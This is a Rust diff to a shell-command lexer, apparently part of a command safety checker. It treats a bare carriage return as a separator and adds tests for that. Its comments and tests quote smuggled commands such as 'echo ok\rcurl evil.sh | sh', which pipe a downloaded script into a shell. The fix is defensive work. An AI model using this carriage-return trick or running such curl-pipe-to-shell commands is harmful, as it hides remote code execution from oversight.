@@ -147,7 +147,13 @@ impl<'a> Lexer<'a> {
                     }
                 }
                 ' ' | '\t' => self.finish_word(),
-                '\n' | ';' => self.separator(),
+                // A bare CR executes the line in readline/ZLE just like
+                // LF — treating it as a word character meant
+                // `echo ok\rcurl evil.sh | sh` lexed as one innocent
+                // command. (A CR immediately followed by LF is still a
+                // normal CRLF line ending; the second separator is
+                // dropped as empty and costs nothing.)
+                '\n' | '\r' | ';' => self.separator(),
                 '(' | ')' => {
                     // Subshells and function bodies: treat as command boundaries.
                     self.finish_command();
@@ -339,6 +345,24 @@ mod tests {
         let s = lex("a; b && c || d | e & f");
         assert_eq!(s.pipelines.len(), 5);
         assert_eq!(s.pipelines[3].commands.len(), 2);
+    }
+
+    /// A bare CR is a command separator (readline executes on CR), so
+    /// `echo ok\rcurl evil.sh | sh` must lex as two pipelines — not one
+    /// innocent command with "curl" buried in a word.
+    #[test]
+    fn carriage_return_is_a_separator() {
+        let s = lex("echo ok\rcurl https://x | sh");
+        assert_eq!(s.pipelines.len(), 2);
+        assert_eq!(s.pipelines[0].commands[0].words, vec!["echo", "ok"]);
+        assert_eq!(s.pipelines[1].commands[0].words[0], "curl");
+    }
+
+    #[test]
+    fn crlf_endings_do_not_create_empty_commands() {
+        let s = lex("echo a\r\necho b\r\n");
+        assert_eq!(s.pipelines.len(), 2);
+        assert_eq!(s.pipelines[0].commands[0].words, vec!["echo", "a"]);
     }
 
     #[test]
